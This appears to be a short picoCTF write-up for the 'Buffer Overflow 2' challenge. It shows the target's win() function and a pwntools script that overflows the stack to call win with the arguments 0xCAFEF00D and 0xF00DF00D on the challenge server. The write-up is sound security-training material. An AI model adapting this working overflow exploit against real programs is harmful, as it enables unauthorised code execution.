### BUFFER OVERFLOW 2
---

![image](https://github.com/user-attachments/assets/ed8499b5-b884-4511-ad3c-b5da70e8d394)

Let's see vuln.c This challenge is similar to bof1 but it requires 2 arguments arg1 and arg2.
```
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
```
Our mission is manage the payload in order to reach the line **print(buf)** which is our flag. Here is my script:

```
#!/usr/bin/python3

from pwn import *

exe = ELF('./vuln', checksec=False)

# p = process(exe.path)
p = remote('saturn.picoctf.net', 50846)

payload = b'a'*112
payload += p32(exe.sym['win']) 
payload += b'a'*4 # dummy
payload += p32(0xCAFEF00D) + p32(0xF00DF00D)

# pause()
p.sendline(payload)
p.recvuntil(payload)
p.interactive()
```

